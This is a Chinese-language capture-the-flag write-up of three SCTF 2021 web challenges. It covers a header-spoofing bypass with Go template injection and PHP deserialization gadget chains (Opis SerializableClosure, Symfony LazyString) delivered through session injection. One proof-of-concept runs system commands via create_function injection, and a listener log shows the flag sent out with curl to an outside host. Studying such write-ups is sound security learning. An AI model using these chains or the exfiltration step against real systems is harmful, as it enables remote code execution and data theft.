# SCTF 2021 Writeup by Dest0g3
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## Web
###  Loginme
上来说要用localhost
直接搞403了，附件给了源码
middleware.go：
x-forwarded-for 和 x-client-ip 都被ban了，用 x-real-ip
    x-real-ip: 127.0.0.1
?id=0 到这儿
GET 随便传 age ，传什么反什么，考虑ssti
试了一下go最简单的ssti
    ?id=0&age={{.Password}}
###  Upload_it
任意上传文件：
            Upload
            Upload files casually XD
                FILE: 
                PATH: 
            or...Just look at the phpinfo?
            go to phpinfo
    CODE;
    }
发现给了`composer.json`，拿`composer`把`vendor`下载下来，是`opis`和`symfony`：
查了一下发现thinkphp的反序列化里面也用到了，利用的是`\Opis\Closure\SerializableClosure`：
它的`__invoke`：
所以可以想办法利用这里，继续往前找可以触发`__invoke`的点，发现了`LazyString`的`__toString`：
想办法触发`__toString`即可。
发现index.php的这里：
    $upload_file_path = $_SESSION["upload_path"]."/".$_POST['path'];
上传session控制`$_SESSION`即可。
POC：
    value = new \Opis\Closure\SerializableClosure($func);
            }
        }
    }
    namespace {
        include_once "./vendor/autoload.php";
        session_start();
        use Symfony\Component\String\LazyString;
        $a= new LazyString();
        $_SESSION["upload_path"] = $a;
    }
在本地找到session文件：
把它上传到`tmp`目录下面：
（不这样也行，把所有属性都改成`public`）
然后PHPSESSID改成`cm19qh3da8eo1thluucm1hlqkf`后再上传文件即可触发：
但实际上好像不是这样的。。。好像触发点是`__sleep`？`ezosu`也是这样。
###  ezosu
一个imiphp的题：
    response->redirect("/index.html");
        }
        /**
         * @Action
         * 
         * @return array
         */
        public function config()
        {
            $method = $this->request->getMethod();
            $res = [
                "msg" => "ok",
                "status" => "200",
                "value" => true
            ];
            if ($method === "POST") {
                Session::clear();
                $configData = $this->request->getParsedBody();
                foreach ($configData as $k => $v) {
                    Session::set($k, $v);
                }
            } else if ($method === "GET") {
                $configData = Session::get();
                if ($configData != null) {
                    $res["value"] = $configData;
                } else {
                    $res = [
                        "msg" => "Not Find",
                        "status" => "404",
                        "value" => null
                    ];
                }
            } else {
                $res = [
                    "msg" => "Unsupported method",
                    "status" => "405",
                    "value" => false
                ];
            }
            return $res;
        }
    }
可以自定义session。把题目环境的文件和imi官方的文件进行比对了一下，发现多了这么一行东西：
尝试进行恶意的session注入：
所以就是找imi的链子了（但是没找到）。。。。
找到的是被`__wakeup`的，后面一部分包含了`__toString`。
比赛的时候盲猜会不会`SESSION`对象在imi中有什么处理然后触发`__toString`，试了一下过了成功触发了。。。
直接看POC就知道了，最后的RCE点：
考虑到php7.4而且没回显而且写进session时候有些字符还会出问题，想到了`create_function`注入。
POC：
    value =[$a,'getIterator'];
            }
        }
    }
    namespace PhpOption{
        final class LazyOption{
            public $option = null;
            public $callback = 'create_function';
            public $arguments = ['',"}system(base64_decode('xxx'));//"];
        }
    }
    namespace {
        use Symfony\Component\String\LazyString;
        session_start();
        $_SESSION['feng'] = new LazyString();
    }
然后填进去：
2次即可触发。然后curl外带出来flag就行了。
    root@VM-0-6-ubuntu:~# nc -lvvp 39767
    Listening on [0.0.0.0] (family 0, port 39767)
    Connection from ecs-124-70-204-21.compute.hwclouds-dns.com 56688 received!
    POST / HTTP/1.1
    Host: 121.5.169.223:39767
    User-Agent: curl/7.76.1
    Accept: */*
    Content-Length: 2034
    Content-Type: multipart/form-data; boundary=------------------------484cb7eb09ce5048
    --------------------------484cb7eb09ce5048
    Content-Disposition: form-data; name="file"; filename="1.txt"